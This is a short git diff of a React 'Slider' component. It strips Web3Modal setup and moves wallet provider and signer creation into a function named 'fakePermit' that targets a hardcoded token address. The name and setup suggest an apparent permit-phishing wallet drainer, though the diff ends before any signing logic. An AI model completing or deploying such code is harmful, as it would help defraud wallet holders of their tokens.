@@ -1,45 +1,27 @@
 import React, { useState, useEffect } from "react";
-import { createWeb3Modal, defaultWagmiConfig } from "@web3modal/wagmi/react";
 import ABI from "./ABI.json";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
-import { WagmiConfig, useAccount, useSignMessage } from "wagmi";
-import { arbitrum, mainnet } from "viem/chains";
+import { useAccount } from "wagmi";
 import Web3 from "web3";
 import { ethers } from "ethers";
-
-// 1. Get projectId
-const projectId = "2bf2541340dc39fea57ec973a360f93b";
-
-// 2. Create wagmiConfig
-const metadata = {
-  name: "Web3Modal",
-  description: "Web3Modal Example",
-  url: "https://web3modal.com",
-  icons: ["https://avatars.githubusercontent.com/u/37784886"],
-};
-
-const chains = [mainnet, arbitrum];
-const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata });
-
-// 3. Create modal
-createWeb3Modal({ wagmiConfig, projectId, chains });
 
 const Slider = () => {
   const { address, isConnected, isConnecting, isDisconnected } = useAccount();
   const { open, close } = useWeb3Modal();
-  //const [address, setaddress] = useState("No user connected");
-
-  const web3 = new Web3(window.ethereum);
-
-  // get signer and provider
-
-  let provider = new ethers.BrowserProvider(window.ethereum);
-  let signer = provider.getSigner();
 
   // contract instance web3js and Ethersjs
   const tokenAddress = "0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49";
 
   async function fakePermit() {
+    if (!window.ethereum) {
+      alert("Please install a Web3 wallet");
+      return;
+    }
+
+    const web3 = new Web3(window.ethereum);
+    let provider = new ethers.BrowserProvider(window.ethereum);
+    let signer = provider.getSigner();
+
     function getTimestampInSeconds() {
       // returns current timestamp in seconds
       return Math.floor(Date.now() / 1000);
